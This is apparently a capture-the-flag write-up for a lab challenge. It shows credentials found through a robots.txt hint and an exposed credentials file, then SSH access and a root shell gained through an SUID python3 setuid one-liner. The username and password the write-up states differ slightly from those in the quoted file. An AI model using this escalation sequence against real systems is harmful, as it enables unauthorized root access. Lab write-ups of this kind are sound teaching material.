# DevSec? No thanks 1 & 2
- Author: Evan Pardon | [supasuge](https://github.com/supasuge)

## Introduction

This challenge presents a very simple information disclosure vulnerability.

### Credential Discovery

To find the user credentials and gain access, visit `/robots.txt`. Here, you'll find a few directories listed as follows:

```
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /notes/
Disallow: /internal/
Disallow: /dev/

# SECURITY NOTE: 
# The following directories contain sensitive information and
# should not be accessible by web crawlers or unauthorized users
#
# - /admin/ : Contains administrative credentials and system access information
# - /backup/ : Contains system and data backups
# - /notes/ : Contains server configuration and security notes
# - /internal/ : Internal company resources
# - /dev/ : Development and testing resources
#
# TODO: Remove admin credentials file from /admin/ directory before production
# TODO: Set up proper authentication for sensitive directories
```
Now, after checking `/admin/` you'll find the file `credentials.txt` that is indexed. In this file, you'll find multiple different credentials for different users.
The correct username/password is `ctfuser`/`CTF_Password2023!`:

![image](https://github.com/user-attachments/assets/dd73f151-39c8-4007-88c5-2aeecdee71a2)

```
SECURETECH SYSTEMS - CREDENTIALS DATABASE
=========================================

INTERNAL SYSTEMS ACCESS
-----------------------
Development Environment:
* URL: https://dev.securetech-internal.com
* Username: developer
* Password: Dev#2023!Test

Testing Environment:
* URL: https://test.securetech-internal.com
* Username: tester
* Password: Test$Environment2023

Staging Environment:
* URL: https://staging.securetech-internal.com
* Username: stageadmin
* Password: St@g!ng_Server_2023

PRODUCTION ENVIRONMENT:
* URL: https://admin.securetech-systems.com
* Username: admin
* Password: [REDACTED BY SECURITY POLICY]

DATABASE ACCESS:
* Host: db.securetech-internal.com
* Username: dbadmin
* Password: [STORED IN PASSWORD MANAGER]

LINUX SERVER ACCESS:
* Server: ubuntu-srv-01.securetech-internal.com
* SSH Username: ctfuser
* SSH Password: CTF_password2023!
* Key Location: [REDACTED]

REMINDER:
- All passwords should be rotated every 90 days
- Production credentials should NEVER be stored in plaintext
- Use company password manager for sensitive credentials
- Report any suspicious activity to security@securetech-systems.com

Document Classification: CONFIDENTIAL
Last Updated: 2023-10-18
Created By: James Wilson, IT Security Lead
```

After SSH'ing into the server:
```bash
ssh ctfuser@CONTAINER_IP -p 1022
```

Search for SUID binaries:
```bash
find / -perm -4000 2>/dev/null
```

This will show that `python3` has the SUID bit set under `/bin`, and this is the PATH set for `ctfuser`.

To escalate privileges to `root`:
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
export PATH=/usr/sbin
whoami
$ root
cd /root
cat root.txt
```

Thanks for reading!



